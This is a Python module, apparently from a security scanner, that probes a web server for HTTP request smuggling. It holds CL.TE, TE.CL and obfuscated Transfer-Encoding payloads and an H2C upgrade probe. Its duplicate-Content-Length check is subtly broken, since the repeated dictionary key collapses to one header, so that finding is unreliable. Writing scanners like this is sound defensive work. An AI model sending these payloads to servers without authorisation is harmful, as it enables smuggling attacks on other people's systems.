"""HTTP Desync / Request Splitting — test for HTTP desynchronization attacks."""

import aiohttp
import asyncio
import socket
from urllib.parse import urlparse
from modules.core import console

CL_TE_PAYLOADS = [
    {
        'name': 'CL.TE Basic',
        'raw': b'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG',
    },
    {
        'name': 'CL.TE Extended',
        'raw': b'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED',
    },
]

TE_CL_PAYLOADS = [
    {
        'name': 'TE.CL Basic',
        'raw': b'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n',
    },
]

TE_TE_PAYLOADS = [
    {
        'name': 'TE.TE Obfuscation 1',
        'headers': {'Transfer-Encoding': 'chunked', 'Transfer-encoding': 'cow'},
    },
    {
        'name': 'TE.TE Obfuscation 2',
        'headers': {'Transfer-Encoding': 'chunked', 'Transfer-Encoding ': 'x'},
    },
    {
        'name': 'TE.TE Tab',
        'headers': {'Transfer-Encoding': '\tchunked'},
    },
    {
        'name': 'TE.TE Newline',
        'headers': {'Transfer-Encoding': 'chunked\r\nX-Ignore: x'},
    },
]


async def _test_desync_headers(session, url):
    """Test for TE.TE desync via header obfuscation."""
    findings = []

    for payload in TE_TE_PAYLOADS:
        try:
            headers = payload['headers'].copy()
            async with session.post(url, headers=headers, data='0\r\n\r\n',
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    ssl=False) as resp:
                if resp.status != 400:
                    findings.append({
                        'type': f'HTTP Desync ({payload["name"]})',
                        'status': resp.status,
                        'severity': 'High',
                        'detail': 'Server accepted obfuscated Transfer-Encoding',
                    })
        except Exception:
            pass

    return findings


async def _test_cl_mismatch(session, url):
    """Test Content-Length mismatch handling."""
    findings = []

    try:
        short_body = 'A' * 10
        headers = {'Content-Length': '100'}
        try:
            async with session.post(url, headers=headers, data=short_body,
                                    timeout=aiohttp.ClientTimeout(total=5),
                                    ssl=False) as resp:
                if resp.status not in [400, 411]:
                    findings.append({
                        'type': 'Content-Length Mismatch Accepted',
                        'status': resp.status,
                        'severity': 'Medium',
                        'detail': 'Server accepted mismatched Content-Length (sent 10, claimed 100)',
                    })
        except Exception:
            pass

        headers = {'Content-Length': '5', 'Content-Length': '10'}
        try:
            async with session.post(url, headers=headers, data='AAAAAAAAAA',
                                    timeout=aiohttp.ClientTimeout(total=5),
                                    ssl=False) as resp:
                if resp.status not in [400]:
                    findings.append({
                        'type': 'Duplicate Content-Length Accepted',
                        'status': resp.status,
                        'severity': 'Medium',
                    })
        except Exception:
            pass
    except Exception:
        pass

    return findings


async def _test_h2c_smuggling(session, url):
    """Test for H2C smuggling via Upgrade header."""
    findings = []

    try:
        headers = {
            'Upgrade': 'h2c',
            'Connection': 'Upgrade, HTTP2-Settings',
            'HTTP2-Settings': 'AAEAABAAAAIAAAABAAN_____AAQAAP__',
        }
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=8),
                               ssl=False) as resp:
            if resp.status == 101:
                findings.append({
                    'type': 'H2C Smuggling',
                    'status': resp.status,
                    'severity': 'High',
                    'detail': 'Server supports h2c upgrade — potential smuggling vector',
                })
    except Exception:
        pass

    return findings


async def scan_http_desync(session, url):
    """Scan for HTTP desynchronization / request splitting."""
    console.print(f"\n[bold cyan]--- HTTP Desync / Request Splitting ---[/bold cyan]")

    all_findings = []

    console.print(f"  [cyan]Testing TE.TE obfuscation ({len(TE_TE_PAYLOADS)} variants)...[/cyan]")
    te_findings = await _test_desync_headers(session, url)
    all_findings.extend(te_findings)
    for f in te_findings:
        console.print(f"  [red]{f['type']}[/red]")

    console.print(f"  [cyan]Testing Content-Length mismatch...[/cyan]")
    cl_findings = await _test_cl_mismatch(session, url)
    all_findings.extend(cl_findings)
    for f in cl_findings:
        console.print(f"  [yellow]{f['type']}[/yellow]")

    console.print(f"  [cyan]Testing H2C smuggling...[/cyan]")
    h2c_findings = await _test_h2c_smuggling(session, url)
    all_findings.extend(h2c_findings)
    for f in h2c_findings:
        console.print(f"  [red]{f['type']}[/red]")

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} desync vectors found![/bold red]")
    else:
        console.print(f"\n  [green]✓ No HTTP desync vulnerabilities detected[/green]")

    return {'findings': all_findings}
